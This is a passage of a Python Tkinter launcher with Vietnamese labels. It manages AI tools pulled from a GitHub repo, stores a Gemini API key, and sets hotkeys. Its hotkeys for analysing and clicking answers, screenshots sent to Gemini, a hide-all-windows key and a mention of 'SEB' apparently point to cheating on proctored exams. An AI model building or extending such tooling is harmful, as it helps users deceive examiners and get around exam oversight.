        self.cards_frame = tk.Frame(self.canvas, bg=BG)

        self.cards_frame.bind(
            "<Configure>",
            lambda e: self.canvas.configure(
                scrollregion=self.canvas.bbox("all")
            )
        )

        self.canvas_window = self.canvas.create_window(
            (0, 0),
            window=self.cards_frame,
            anchor="nw"
        )
        self.canvas.bind(
            "<Configure>",
            lambda e: self.canvas.itemconfig(
                self.canvas_window,
                width=e.width
            )
        )
        self.canvas.configure(yscrollcommand=scrollbar.set)

        self.canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")

        self.canvas.bind_all(
            "<MouseWheel>",
            lambda e: self.canvas.yview_scroll(
                int(-1 * (e.delta / 120)),
                "units"
            )
        )

        footer = tk.Frame(self, bg=PANEL, height=62)
        footer.pack(fill="x", side="bottom")
        footer.pack_propagate(False)

        self.github_status = tk.Label(
            footer,
            text="GitHub: chưa cấu hình",
            bg=PANEL,
            fg=YELLOW,
            font=("Segoe UI", 9)
        )
        self.github_status.pack(side="left", padx=(28, 14))

        self.api_status = tk.Button(
            footer,
            text="Gemini API: kiểm tra",
            command=self.open_api_dialog,
            bg=PANEL,
            fg=MUTED,
            activebackground=CARD,
            activeforeground=TEXT,
            bd=0,
            cursor="hand2",
            font=("Segoe UI", 9)
        )
        self.api_status.pack(side="left", padx=6)

        self.status_label = tk.Label(
            footer,
            text="● GitHub: Chưa kết nối",
            bg=PANEL,
            fg=YELLOW,
            font=("Segoe UI Semibold", 9)
        )
        self.status_label.pack(side="right", padx=28)

        self._refresh_footer()

    def _refresh_footer(self):
        repo = self.settings.get("repo", "").strip()
        if repo:
            self.github_status.config(
                text=f"GitHub: {repo}",
                fg=MUTED
            )
        else:
            self.github_status.config(
                text="GitHub: chưa cấu hình",
                fg=YELLOW
            )

        if GEMINI_KEY_FILE.exists() and GEMINI_KEY_FILE.read_text(
            encoding="utf-8", errors="ignore"
        ).strip():
            self.api_status.config(
                text="Gemini API: ● Có key",
                fg=GREEN
            )
        else:
            self.api_status.config(
                text="Gemini API: chưa có key",
                fg=YELLOW
            )

        # Góc phải dưới CHỈ hiển thị kết nối GitHub.
        if self._github_connected:
            self.status_label.config(
                text="● GitHub: Đã kết nối",
                fg=GREEN
            )
        else:
            self.status_label.config(
                text="● GitHub: Chưa kết nối",
                fg=YELLOW
            )

    def set_status(self, text, color=None):
        """
        Giữ API cũ để các phần camera/update không phải sửa hàng loạt,
        nhưng KHÔNG cho chúng ghi đè góc phải dưới.
        Góc đó chỉ dành cho trạng thái GitHub.
        """
        self._refresh_footer()

    def clear_cards(self):
        for child in self.cards_frame.winfo_children():
            child.destroy()

    def refresh_tools(self):
        r"""
        Hiển thị tool theo thứ tự ưu tiên:

        1. C:\duc\tools\<id>                  (bản local/GitHub mới nhất)
        2. C:\duc\tools\<id>.__old__/.__new__ (fallback update lỗi)
        3. tools_seed bên trong DucTool.exe    (fallback cuối cùng)

        Nhờ vậy SEB không thể biến mất khỏi menu chỉ vì thư mục local
        đang hỏng hoặc bị Windows khóa.
        """
        self._recover_interrupted_tool_updates()
        self._seed_local_tools()
        self._recover_interrupted_tool_updates()

        tools_by_id = {}

        def add_from_folder(folder):
            try:
                meta = read_tool_meta(folder)
            except Exception:
                meta = None

            if not meta:
                return

            tool_id = str(meta.get("id", "")).strip()
            if not tool_id:
                return

            # Nguồn gọi trước có độ ưu tiên cao hơn.
            if tool_id not in tools_by_id:
                tools_by_id[tool_id] = meta

        # --------------------------------------------------
        # 1) LOCAL chuẩn
        # --------------------------------------------------
        try:
            local_folders = [
                p for p in TOOLS_DIR.iterdir()
                if p.is_dir()
            ]
        except Exception:
            local_folders = []

        for folder in local_folders:
            if (
                folder.name.endswith(".__old__")
                or folder.name.endswith(".__new__")
            ):
                continue
            add_from_folder(folder)

        # --------------------------------------------------
        # 2) LOCAL fallback .__old__ / .__new__
        # --------------------------------------------------
        for folder in local_folders:
            if (
                folder.name.endswith(".__old__")
                or folder.name.endswith(".__new__")
            ):
                add_from_folder(folder)

        # --------------------------------------------------
        # 3) BUNDLED tools_seed fallback
        # --------------------------------------------------
        seed_candidates = [
            resource_path("tools_seed"),
            APP_DIR / "tools_seed",
            APP_DIR.parent / "tools",
            APP_DIR / "tools",
        ]

        for seed_root in seed_candidates:
            if not seed_root.is_dir():
                continue

            found_seed = False

            try:
                seed_folders = [
                    p for p in seed_root.iterdir()
                    if p.is_dir()
                ]
            except Exception:
                seed_folders = []

            for folder in seed_folders:
                meta = read_tool_meta(folder)
                if meta:
                    found_seed = True
                    tool_id = str(meta.get("id", "")).strip()

                    # Chỉ dùng seed khi local/fallback chưa có.
                    if tool_id and tool_id not in tools_by_id:
                        tools_by_id[tool_id] = meta

            if found_seed:
                break

        tools = list(tools_by_id.values())

        tools.sort(
            key=lambda m: (
                int(m.get("order", 9999)),
                str(m.get("name", "")).lower()
            )
        )

        self.clear_cards()

        self.count_label.config(
            text=f"{len(tools)} tool" + (
                "" if len(tools) == 1 else "s"
            )
        )

        if not tools:
            empty = tk.Frame(
                self.cards_frame,
                bg=CARD,
                padx=25,
                pady=30
            )
            empty.pack(fill="x", pady=8)

            tk.Label(
                empty,
                text="Chưa có tool nào",
                bg=CARD,
                fg=TEXT,
                font=("Segoe UI Semibold", 15)
            ).pack(anchor="w")

            tk.Label(
                empty,
                text="Cấu hình GitHub rồi bấm “Kiểm tra cập nhật”.",
                bg=CARD,
                fg=MUTED,
                font=("Segoe UI", 10)
            ).pack(anchor="w", pady=(5, 0))
            return

        accents = [
            PURPLE,
            BLUE,
            GREEN,
            "#e46db3",
            "#e58b45"
        ]

        for i, meta in enumerate(tools):
            self.add_tool_card(
                meta,
                accents[i % len(accents)]
            )

    def add_tool_card(self, meta, accent):
        outer = tk.Frame(self.cards_frame, bg=BORDER)
        outer.pack(fill="x", pady=7)

        card = tk.Frame(outer, bg=CARD, padx=20, pady=15)
        card.pack(fill="both", padx=1, pady=1)

        left = tk.Frame(card, bg=CARD)
        left.pack(side="left", fill="both", expand=True)

        name = str(meta.get("name", meta.get("id", "Tool")))
        version = str(meta.get("version", "")).strip()
        title = name

        title_label = tk.Label(
            left,
            text=title,
            bg=CARD,
            fg=TEXT,
            font=("Segoe UI Semibold", 15)
        )
        title_label.pack(anchor="w")

        desc_label = tk.Label(
            left,
            text=str(meta.get("description", "")),
            bg=CARD,
            fg=MUTED,
            font=("Segoe UI", 9),
            justify="left",
            wraplength=620
        )
        desc_label.pack(anchor="w", pady=(4, 0))

        actions_box = tk.Frame(card, bg=CARD)
        actions_box.pack(side="right", padx=(20, 0))

        btn = tk.Button(
            actions_box,
            text=str(meta.get("button_text", "MỞ TOOL")),
            command=lambda m=dict(meta): self.launch_tool(m),
            bg=accent,
            fg="white",
            activebackground=accent,
            activeforeground="white",
            bd=0,
            padx=19,
            pady=9,
            cursor="hand2",
            font=("Segoe UI Semibold", 9)
        )
        btn.pack(side="right")

        if bool(meta.get("show_setup", True)):
            setup_btn = tk.Button(
                actions_box,
                text="SETUP",
                command=lambda m=dict(meta): self.open_tool_setup(m),
                bg="#303746",
                fg=TEXT,
                activebackground="#3a4354",
                activeforeground="white",
                bd=0,
                padx=14,
                pady=9,
                cursor="hand2",
                font=("Segoe UI Semibold", 9)
            )
            setup_btn.pack(side="right", padx=(0, 8))

        def enter(_):
            for w in (card, left, title_label, desc_label, actions_box):
                w.configure(bg=CARD_HOVER)

        def leave(_):
            for w in (card, left, title_label, desc_label, actions_box):
                w.configure(bg=CARD)

        for w in (outer, card, left, title_label, desc_label, actions_box):
            w.bind("<Enter>", enter)
            w.bind("<Leave>", leave)

    def python_executable(self):
        exe = Path(sys.executable)
        if exe.name.lower() == "pythonw.exe":
            p = exe.with_name("python.exe")
            if p.exists():
                return str(p)
        return str(exe)

    def launch_tool(self, meta):
        folder = Path(meta["_folder"])
        entry = folder / str(meta["entry"])

        if not entry.exists():
            messagebox.showerror(
                "Không tìm thấy tool",
                f"Thiếu file:\n{entry}"
            )
            return

        try:
            if getattr(sys, "frozen", False):
                # The same EXE becomes a child Python runner. No system Python needed.
                cmd = [sys.executable, "--run-tool", str(entry)]
            else:
                # Development mode when launcher_exe.py is run with normal Python.
                cmd = [sys.executable, str(Path(__file__).resolve()), "--run-tool", str(entry)]

            creationflags = 0
            if os.name == "nt":
                # The child calls AllocConsole itself. DETACHED_PROCESS avoids a console
                # flashing behind the GUI launcher before the tool console is allocated.
                creationflags = getattr(subprocess, "DETACHED_PROCESS", 0)

            process = subprocess.Popen(
                cmd,
                cwd=str(folder),
                creationflags=creationflags
            )

            # Lưu PID để nút "ẨN TẤT CẢ" có thể ẩn cửa sổ tool này.
            self._tool_processes.append(process)

            # Nếu launcher đang ở trạng thái ẩn mà tool vừa được mở bằng
            # một luồng nào đó, bảo đảm cửa sổ tool cũng bị ẩn ngay.
            if self._is_hidden:
                self.after(150, self._repeat_hide_tool_windows)
                self.after(500, self._repeat_hide_tool_windows)
                self.after(1000, self._repeat_hide_tool_windows)

            self.set_status(
                f"Đã mở {meta.get('name', meta.get('id'))}",
                GREEN
            )
        except Exception as e:
            messagebox.showerror("Không thể mở tool", str(e))
            self.set_status("Lỗi mở tool", RED)

    def open_tool_setup(self, meta):
        """SETUP GUI riêng cho một tool."""
        tool_id = str(meta.get("id", "")).strip()
        if not tool_id:
            return

        tool_name = str(meta.get("name", tool_id))
        config = self.load_tool_config_external(tool_id)

        win = tk.Toplevel(self)
        win.title(f"SETUP - {tool_name}")

        # Cửa sổ SETUP rộng/cao hơn và tự co theo màn hình.
        screen_w = win.winfo_screenwidth()
        screen_h = win.winfo_screenheight()

        setup_w = min(760, max(680, screen_w - 140))
        setup_h = min(690, max(620, screen_h - 140))

        x = max(0, (screen_w - setup_w) // 2)
        y = max(0, (screen_h - setup_h) // 2)

        win.geometry(
            f"{setup_w}x{setup_h}+{x}+{y}"
        )
        win.minsize(680, 620)
        win.configure(bg=BG)
        win.transient(self)
        win.grab_set()

        # Footer được pack trước để nút LƯU luôn còn chỗ hiển thị.
        footer = tk.Frame(
            win,
            bg=PANEL,
            height=72
        )
        footer.pack(
            side="bottom",
            fill="x"
        )
        footer.pack_propagate(False)

        body = tk.Frame(
            win,
            bg=BG
        )
        body.pack(
            side="top",
            fill="both",
            expand=True
        )

        tk.Label(
            body,
            text=f"SETUP • {tool_name}",
            bg=BG,
            fg=TEXT,
            font=("Segoe UI Semibold", 17)
        ).pack(anchor="w", padx=26, pady=(22, 3))

        tk.Label(
            body,
            text=f"Config: C:\\duc\\configs\\{tool_id}.json",
            bg=BG,
            fg=MUTED,
            font=("Segoe UI", 9)
        ).pack(anchor="w", padx=26, pady=(0, 14))

        # API dùng chung.
        tk.Label(
            body,
            text="Gemini API Key (dùng chung cho tất cả tool)",
            bg=BG,
            fg=MUTED,
            font=("Segoe UI", 9)
        ).pack(anchor="w", padx=26)

        api_current = ""
        if GEMINI_KEY_FILE.exists():
            api_current = GEMINI_KEY_FILE.read_text(
                encoding="utf-8",
                errors="ignore"
            ).strip()

        api_var = tk.StringVar(value=api_current)
        api_entry = tk.Entry(
            body,
            textvariable=api_var,
            show="•",
            bg=CARD,
            fg=TEXT,
            insertbackground=TEXT,
            relief="flat",
            font=("Consolas", 10)
        )
        api_entry.pack(fill="x", padx=26, pady=(4, 8), ipady=8)

        tk.Button(
            body,
            text="Mở Google AI Studio lấy API",
            command=lambda: webbrowser.open(
                "https://aistudio.google.com/api-keys"
            ),
            bg=BG,
            fg=BLUE,
            activebackground=BG,
            activeforeground=TEXT,
            bd=0,
            cursor="hand2",
            font=("Segoe UI Semibold", 9)
        ).pack(anchor="w", padx=22, pady=(0, 12))

        # Model.
        tk.Label(
            body,
            text="Model Gemini",
            bg=BG,
            fg=MUTED,
            font=("Segoe UI", 9)
        ).pack(anchor="w", padx=26)

        model_names = [m["name"] for m in MODEL_CATALOG]
        current_model_name = str(config.get("model_name", model_names[0]))
        if current_model_name not in model_names:
            current_model_name = model_names[0]

        model_var = tk.StringVar(value=current_model_name)
        model_menu = tk.OptionMenu(
            body,
            model_var,
            *model_names
        )
        model_menu.config(
            bg=CARD,
            fg=TEXT,
            activebackground=CARD_HOVER,
            activeforeground=TEXT,
            highlightthickness=0,
            bd=0,
            font=("Segoe UI", 10)
        )
        model_menu["menu"].config(
            bg=CARD,
            fg=TEXT,
            activebackground=PURPLE,
            activeforeground="white"
        )
        model_menu.pack(fill="x", padx=26, pady=(4, 12))

        # Hotkey chính. Tool screenshot_clipboard dùng 2 nút theo kiểu
        # Nút 1 = chụp thêm ảnh, Nút 2 = gửi cả lô ảnh sang Gemini.
        primary_hotkey_label = (
            "Nút 1 - Chụp thêm ảnh"
            if tool_id == "screenshot_clipboard"
            else "Phím Phân tích / Gửi Gemini"
        )
        tk.Label(
            body,
            text=primary_hotkey_label,
            bg=BG,
            fg=MUTED,
            font=("Segoe UI", 9)
        ).pack(anchor="w", padx=26)

        hotkey_var = tk.StringVar(
            value=str(config.get("hotkey", "/"))
        )
        tk.Entry(
            body,
            textvariable=hotkey_var,
            bg=CARD,
            fg=TEXT,
            insertbackground=TEXT,
            relief="flat",
            font=("Consolas", 11)
        ).pack(fill="x", padx=26, pady=(4, 12), ipady=7)

        click_var = tk.StringVar(
            value=str(config.get("click_hotkey", "'"))
        )

        if tool_id != "file_solver":
            secondary_hotkey_label = (
                "Nút 2 - Gửi tất cả ảnh sang Gemini"
                if tool_id == "screenshot_clipboard"
                else "Phím Click đáp án"
            )
            tk.Label(
                body,
                text=secondary_hotkey_label,
                bg=BG,
                fg=MUTED,
                font=("Segoe UI", 9)
            ).pack(anchor="w", padx=26)

            tk.Entry(
                body,
                textvariable=click_var,
                bg=CARD,
                fg=TEXT,
                insertbackground=TEXT,
                relief="flat",
                font=("Consolas", 11)
            ).pack(fill="x", padx=26, pady=(4, 12), ipady=7)

        def save_setup():
            api_key = api_var.get().strip().strip('"').strip("'")
            if api_key:
                GEMINI_KEY_FILE.write_text(
                    api_key,
                    encoding="utf-8"
                )
                os.environ["GEMINI_API_KEY"] = api_key

            selected = next(
                (
                    m for m in MODEL_CATALOG
                    if m["name"] == model_var.get()
                ),
                MODEL_CATALOG[0]
            )

            analyze_hotkey = hotkey_var.get().strip() or "/"
            click_hotkey = click_var.get().strip() or "'"

            if tool_id != "file_solver" and analyze_hotkey == click_hotkey:
                conflict_text = (
                    "Nút 1 và Nút 2 không được giống nhau."
                    if tool_id == "screenshot_clipboard"
                    else "Phím Phân tích và Phím Click không được giống nhau."
                )
                messagebox.showerror(
                    "Hotkey bị trùng",
                    conflict_text,
                    parent=win
                )
                return

            updates = {
                "model": selected["model"],
                "model_name": selected["name"],
                "level": selected["level"],
                "daily_limit": selected["daily_limit"],
                "hotkey": analyze_hotkey,
                "click_hotkey": click_hotkey,
            }
            if tool_id == "screenshot_clipboard":
                updates["capture_hotkey"] = analyze_hotkey
                updates["send_hotkey"] = click_hotkey
            self.save_tool_config_external(tool_id, updates)
            self._refresh_footer()
            self.set_status(f"Đã lưu setup {tool_name}", GREEN)
            win.destroy()

        bottom = tk.Frame(
            footer,
            bg=PANEL
        )
        bottom.pack(
            fill="both",
            expand=True,
            padx=26,
            pady=14
        )

        tk.Button(
            bottom,
            text="LƯU SETUP",
            command=save_setup,
            bg=GREEN,
            fg="white",
            activebackground=GREEN,
            activeforeground="white",
            bd=0,
            padx=20,
            pady=10,
            cursor="hand2",
            font=("Segoe UI Semibold", 9)
        ).pack(
            side="right",
            padx=(8, 0)
        )

        tk.Button(
            bottom,
            text="MẶC ĐỊNH",
            command=lambda: (
                model_var.set("Gemini 3.5 Flash-Lite"),
                hotkey_var.set("/"),
                click_var.set("'")
            ),
            bg=CARD,
            fg=TEXT,
            activebackground=CARD_HOVER,
            activeforeground=TEXT,
            bd=0,
            padx=18,
            pady=10,
            cursor="hand2",
            font=("Segoe UI Semibold", 9)
        ).pack(side="right", padx=(0, 8))

    def open_api_dialog(self):
        win = tk.Toplevel(self)
        win.title("Gemini API")
        win.geometry("590x235")
        win.configure(bg=BG)
        win.transient(self)
        win.grab_set()

        tk.Label(
            win,
            text="Gemini API Key",
            bg=BG,
            fg=TEXT,
            font=("Segoe UI Semibold", 15)
        ).pack(anchor="w", padx=25, pady=(22, 4))

        tk.Label(
            win,
            text=r"Key chỉ lưu LOCAL tại C:\duc\key.txt, không upload GitHub.",
            bg=BG,
            fg=MUTED,
            font=("Segoe UI", 9)
        ).pack(anchor="w", padx=25)

        current = ""
        if GEMINI_KEY_FILE.exists():
            current = GEMINI_KEY_FILE.read_text(
                encoding="utf-8",
                errors="ignore"
            ).strip()

        var = tk.StringVar(value=current)
        entry = tk.Entry(
            win,
            textvariable=var,
            show="•",
            bg=CARD,
            fg=TEXT,
            insertbackground=TEXT,
            relief="flat",
            font=("Consolas", 10)
        )
        entry.pack(fill="x", padx=25, pady=16, ipady=8)

        def save_key():
            key = var.get().strip().strip('"').strip("'")
            if not key:
                if GEMINI_KEY_FILE.exists():
                    GEMINI_KEY_FILE.unlink()
                self._refresh_footer()
                win.destroy()
                return

            GEMINI_KEY_FILE.write_text(
                key,
                encoding="utf-8"
            )
            os.environ["GEMINI_API_KEY"] = key
            self._refresh_footer()
            self.set_status("Đã lưu Gemini API key", GREEN)
            win.destroy()

        tk.Button(
            win,
            text="LƯU API",
            command=save_key,
            bg=GREEN,
            fg="white",
            activebackground=GREEN,
            activeforeground="white",
            bd=0,
            padx=20,
            pady=9,
            cursor="hand2",
            font=("Segoe UI Semibold", 9)
        ).pack(anchor="e", padx=25)

    def open_settings(self):
        """Trung tâm cài đặt bên ngoài: API, GitHub, hotkey launcher, setup từng tool."""
        win = tk.Toplevel(self)
        win.title("CÀI ĐẶT - Đức Tool")

        # Rộng hơn để không bị cắt tên tool / nút SETUP / scrollbar.
        screen_w = win.winfo_screenwidth()
        screen_h = win.winfo_screenheight()

        settings_w = min(920, max(820, screen_w - 120))
        settings_h = min(780, max(680, screen_h - 120))

        x = max(0, (screen_w - settings_w) // 2)
        y = max(0, (screen_h - settings_h) // 2)

        win.geometry(
            f"{settings_w}x{settings_h}+{x}+{y}"
        )
        win.minsize(820, 680)
        win.configure(bg=BG)
        win.transient(self)
        win.grab_set()

        # Scrollable content.
        canvas = tk.Canvas(
            win,
            bg=BG,
            highlightthickness=0,
            bd=0
        )
        scrollbar = tk.Scrollbar(
            win,
            orient="vertical",
            command=canvas.yview
        )
        content = tk.Frame(canvas, bg=BG)

        content.bind(
            "<Configure>",
            lambda e: canvas.configure(
                scrollregion=canvas.bbox("all")
            )
        )
        content_id = canvas.create_window(
            (0, 0),
            window=content,
            anchor="nw"
        )
        canvas.bind(
            "<Configure>",
            lambda e: canvas.itemconfig(
                content_id,
                width=e.width
            )
        )
        canvas.configure(yscrollcommand=scrollbar.set)
        canvas.pack(
            side="left",
            fill="both",
            expand=True,
            padx=(0, 2)
        )
        scrollbar.pack(
            side="right",
            fill="y",
            padx=(0, 2)
        )

        tk.Label(
            content,
            text="⚙ CÀI ĐẶT",
            bg=BG,
            fg=TEXT,
            font=("Segoe UI Black", 21)
        ).pack(anchor="w", padx=28, pady=(24, 2))

        tk.Label(
            content,
            text="Setup API, token, phím nóng và từng tool ở một chỗ.",
            bg=BG,
            fg=MUTED,
            font=("Segoe UI", 10)
        ).pack(anchor="w", padx=28, pady=(0, 18))

        # ---------- GEMINI ----------
        api_card = tk.Frame(content, bg=CARD, padx=20, pady=16)
        api_card.pack(fill="x", padx=28, pady=7)

        tk.Label(
            api_card,
            text="GEMINI API",
            bg=CARD,
            fg=TEXT,
            font=("Segoe UI Semibold", 13)
        ).pack(anchor="w")

        tk.Label(
            api_card,
            text=r"Lưu local tại C:\duc\key.txt",
            bg=CARD,
            fg=MUTED,
            font=("Segoe UI", 9)
        ).pack(anchor="w", pady=(2, 8))

        api_current = ""
        if GEMINI_KEY_FILE.exists():
            api_current = GEMINI_KEY_FILE.read_text(
                encoding="utf-8",
                errors="ignore"
            ).strip()

        api_var = tk.StringVar(value=api_current)
        tk.Entry(
            api_card,
            textvariable=api_var,
            show="•",
            bg=BG,
            fg=TEXT,
            insertbackground=TEXT,
            relief="flat",
            font=("Consolas", 10)
        ).pack(fill="x", pady=(0, 8), ipady=8)

        tk.Button(
            api_card,
            text="Mở https://aistudio.google.com/api-keys",
            command=lambda: webbrowser.open(
                "https://aistudio.google.com/api-keys"
            ),
            bg=CARD,
            fg=BLUE,
            activebackground=CARD,
            activeforeground=TEXT,
            bd=0,
            cursor="hand2",
            font=("Segoe UI Semibold", 9)
        ).pack(anchor="w")

        # ---------- GITHUB ----------
        github_card = tk.Frame(content, bg=CARD, padx=20, pady=16)
        github_card.pack(fill="x", padx=28, pady=7)

        tk.Label(
            github_card,
            text="GITHUB",
            bg=CARD,
            fg=TEXT,
            font=("Segoe UI Semibold", 13)
        ).pack(anchor="w")

        tk.Label(
            github_card,
            text=f"{FIXED_REPO} • branch {FIXED_BRANCH}",
            bg=CARD,
            fg=GREEN,
            font=("Segoe UI", 9)
        ).pack(anchor="w", pady=(2, 8))

        has_token = bool(self.github_token())
        token_status = tk.Label(
            github_card,
            text=(
                "● Đã lưu GitHub token mã hóa"
                if has_token
                else "Repo public: không cần token • Private: chưa có token"
            ),
            bg=CARD,
            fg=GREEN if has_token else MUTED,
            font=("Segoe UI", 9)
        )
        token_status.pack(anchor="w", pady=(0, 8))

        github_buttons = tk.Frame(github_card, bg=CARD)
        github_buttons.pack(fill="x")

        def set_token():
            token = simpledialog.askstring(
                "GitHub Token",
                "Dán Fine-grained token mới.\nToken được mã hóa bằng Windows DPAPI.",
                parent=win,
                show="•"
            )
            if token is None:
                return
            token = token.strip()
            if not token:
                return
            try:
                save_github_token_secure(token)
                token_status.config(
                    text="● Đã lưu GitHub token mã hóa",
                    fg=GREEN
                )
            except Exception as e:
                messagebox.showerror(
                    "Không lưu được token",
                    str(e),
                    parent=win
                )

        def remove_token():
            try:
                save_github_token_secure("")
            except Exception:
                pass
            token_status.config(
                text="Repo public: không cần token • Private: chưa có token",
                fg=MUTED
            )

        tk.Button(
            github_buttons,
            text="NHẬP / ĐỔI TOKEN",
            command=set_token,
            bg=PURPLE,
            fg="white",
            activebackground=PURPLE,
            activeforeground="white",
            bd=0,
            padx=14,
            pady=8,
            cursor="hand2",
            font=("Segoe UI Semibold", 9)
        ).pack(side="left")

        tk.Button(
            github_buttons,
            text="XÓA TOKEN",
            command=remove_token,
            bg=BG,
            fg=RED,
            activebackground=BG,
            activeforeground=RED,
            bd=0,
            padx=14,
            pady=8,
            cursor="hand2",
            font=("Segoe UI Semibold", 9)
        ).pack(side="left", padx=(8, 0))

        # ---------- LAUNCHER ----------
        launcher_card = tk.Frame(content, bg=CARD, padx=20, pady=16)
        launcher_card.pack(fill="x", padx=28, pady=7)

        tk.Label(
            launcher_card,
            text="APP / PHÍM HỆ THỐNG",
            bg=CARD,
            fg=TEXT,
            font=("Segoe UI Semibold", 13)
        ).pack(anchor="w")

        auto_var = tk.BooleanVar(
            value=bool(self.settings.get("auto_update", True))
        )
        tk.Checkbutton(
            launcher_card,
            text="Tự kiểm tra và cập nhật khi mở app",
            variable=auto_var,
            bg=CARD,
            fg=TEXT,
            selectcolor=BG,
            activebackground=CARD,
            activeforeground=TEXT,
            font=("Segoe UI", 9)
        ).pack(anchor="w", pady=(8, 10))

        tk.Label(
            launcher_card,
            text="Phím ẨN / HIỆN TẤT CẢ",
            bg=CARD,
            fg=MUTED,
            font=("Segoe UI", 9)
        ).pack(anchor="w")

        toggle_var = tk.StringVar(
            value=str(
                self.settings.get(
                    "toggle_hotkey",
                    "ctrl+shift+m"
                )
            )
        )
        tk.Entry(
            launcher_card,
            textvariable=toggle_var,
            bg=BG,
            fg=TEXT,
            insertbackground=TEXT,
            relief="flat",
            font=("Consolas", 10)
        ).pack(fill="x", pady=(4, 8), ipady=7)

        hide_save_row = tk.Frame(
            launcher_card,
            bg=CARD
        )
        hide_save_row.pack(fill="x")

        hide_save_status = tk.Label(
            hide_save_row,
            text="",
            bg=CARD,
            fg=GREEN,
            font=("Segoe UI", 9)
        )
        hide_save_status.pack(side="left")

        def save_hide_hotkey():
            new_hotkey = (
                toggle_var.get().strip()
                or "ctrl+shift+m"
            )

            self.settings["toggle_hotkey"] = new_hotkey
            self.settings["repo"] = FIXED_REPO
            self.settings["branch"] = FIXED_BRANCH
            self.settings["auto_update"] = bool(
                auto_var.get()
            )

            save_json(
                SETTINGS_FILE,
                self.settings
            )

            self._register_launcher_hotkey()

            hide_save_status.config(
                text=f"✓ Đã lưu: {new_hotkey}",
                fg=GREEN
            )

            self.set_status(
                f"Đã lưu phím Ẩn/Hiện: {new_hotkey}",
                GREEN
            )

        tk.Button(
            hide_save_row,
            text="LƯU PHÍM ẨN / HIỆN",
            command=save_hide_hotkey,
            bg=PURPLE,
            fg="white",
            activebackground=PURPLE,
            activeforeground="white",
            bd=0,
            padx=16,
            pady=8,
            cursor="hand2",
            font=("Segoe UI Semibold", 9)
        ).pack(side="right")

        # ---------- TOOLS ----------
        tools_card = tk.Frame(content, bg=CARD, padx=20, pady=16)
        tools_card.pack(fill="x", padx=28, pady=7)

        tk.Label(
            tools_card,
            text="SETUP TOOL",
            bg=CARD,
            fg=TEXT,
            font=("Segoe UI Semibold", 13)
        ).pack(anchor="w")

        tk.Label(
            tools_card,
            text="Mỗi tool dùng config riêng, không ghi đè hotkey của nhau.",
            bg=CARD,
            fg=MUTED,
            font=("Segoe UI", 9)
        ).pack(anchor="w", pady=(2, 12))

        local_tools = []
        for folder in TOOLS_DIR.iterdir():
            if folder.is_dir():
                meta = read_tool_meta(folder)
                if meta:
                    local_tools.append(meta)
        local_tools.sort(
            key=lambda m: int(m.get("order", 9999))
        )

        for meta in local_tools:
            row = tk.Frame(tools_card, bg=BG, padx=12, pady=10)
            row.pack(fill="x", pady=4)

            left = tk.Frame(row, bg=BG)
            left.pack(side="left", fill="x", expand=True)

            tk.Label(
                left,
                text=str(meta.get("name", meta.get("id"))),
                bg=BG,
                fg=TEXT,
                font=("Segoe UI Semibold", 10),
                justify="left",
                anchor="w",
                wraplength=610
            ).pack(anchor="w", fill="x")

            tool_id = str(meta.get("id", ""))
            cfg = self.load_tool_config_external(tool_id)
            if tool_id == "screenshot_clipboard":
                hotkey_summary = (
                    f"{cfg.get('model_name', 'Gemini')} • "
                    f"Chụp: {cfg.get('hotkey', '/')} • "
                    f"Gửi ảnh: {cfg.get('click_hotkey', chr(39))}"
                )
            else:
                hotkey_summary = (
                    f"{cfg.get('model_name', 'Gemini')} • "
                    f"Gửi: {cfg.get('hotkey', '/')}"
                    + (
                        ""
                        if tool_id == "file_solver"
                        else f" • Click: {cfg.get('click_hotkey', chr(39))}"
                    )
                )

            tk.Label(
                left,
                text=hotkey_summary,
                bg=BG,
                fg=MUTED,
                font=("Segoe UI", 8),
                justify="left",
                anchor="w",
                wraplength=610
            ).pack(anchor="w", fill="x", pady=(2, 0))

            tk.Button(
                row,
                text="SETUP",
                command=lambda m=dict(meta): self.open_tool_setup(m),
                bg=PURPLE,
                fg="white",
                activebackground=PURPLE,
                activeforeground="white",
                bd=0,
                padx=15,
                pady=7,
                cursor="hand2",
                font=("Segoe UI Semibold", 8)
            ).pack(side="right")

        def default_setup():
            self.setup_all_defaults()
            messagebox.showinfo(
                "Tự setup",
                (
                    "Đã tạo config mặc định cho các tool chưa có config.\n\n"
                    "Config cũ của bạn không bị ghi đè."
                ),
                parent=win
            )

        tk.Button(
            tools_card,
            text="TỰ SETUP MẶC ĐỊNH",
            command=default_setup,
            bg=GREEN,
            fg="white",
            activebackground=GREEN,
            activeforeground="white",
            bd=0,
            padx=17,
            pady=9,
            cursor="hand2",
            font=("Segoe UI Semibold", 9)
        ).pack(anchor="e", pady=(10, 0))

        # ---------- SAVE ----------
        bottom = tk.Frame(content, bg=BG)
        bottom.pack(fill="x", padx=28, pady=(12, 28))

        def save_global():
            api_key = api_var.get().strip().strip('"').strip("'")
            if api_key:
                GEMINI_KEY_FILE.write_text(
                    api_key,
                    encoding="utf-8"
                )
                os.environ["GEMINI_API_KEY"] = api_key
            elif GEMINI_KEY_FILE.exists():
                GEMINI_KEY_FILE.unlink()

            toggle_hotkey = toggle_var.get().strip() or "ctrl+shift+m"

            self.settings["repo"] = FIXED_REPO
            self.settings["branch"] = FIXED_BRANCH
            self.settings["auto_update"] = bool(auto_var.get())
            self.settings["toggle_hotkey"] = toggle_hotkey
            save_json(SETTINGS_FILE, self.settings)

            self._register_launcher_hotkey()
            self._refresh_footer()
            self.set_status("Đã lưu cài đặt", GREEN)
            win.destroy()

        tk.Button(
            bottom,
            text="LƯU TẤT CẢ CÀI ĐẶT",
            command=save_global,
            bg=GREEN,
            fg="white",
            activebackground=GREEN,
            activeforeground="white",
            bd=0,
            padx=28,
            pady=12,
            cursor="hand2",
            font=("Segoe UI Semibold", 10)
        ).pack(
            side="right",
            fill="x",
            expand=True
        )

    def github_token(self):
        return load_github_token_secure()

    def download_repo_zip(self, owner, repo, branch, dest):
        url = (
            f"https://api.github.com/repos/"
            f"{owner}/{repo}/zipball/{branch}"
        )

        headers = {
            "User-Agent": "Duc-Dynamic-Launcher",
            "Accept": "application/vnd.github+json"
        }

        token = self.github_token()
        if token:
            headers["Authorization"] = f"Bearer {token}"

        request = urllib.request.Request(
            url,
            headers=headers
        )

        with urllib.request.urlopen(
            request,
            timeout=40
        ) as response:
            with open(dest, "wb") as f:
                shutil.copyfileobj(response, f)

    def find_repo_root(self, extracted):
        extracted = Path(extracted)

        # Trường hợp chuẩn: tools/ nằm ngay dưới root repo sau khi giải nén.
        if (extracted / "tools").is_dir():
            return extracted

        # GitHub zipball thường tạo thêm 1 thư mục owner-repo-hash/.
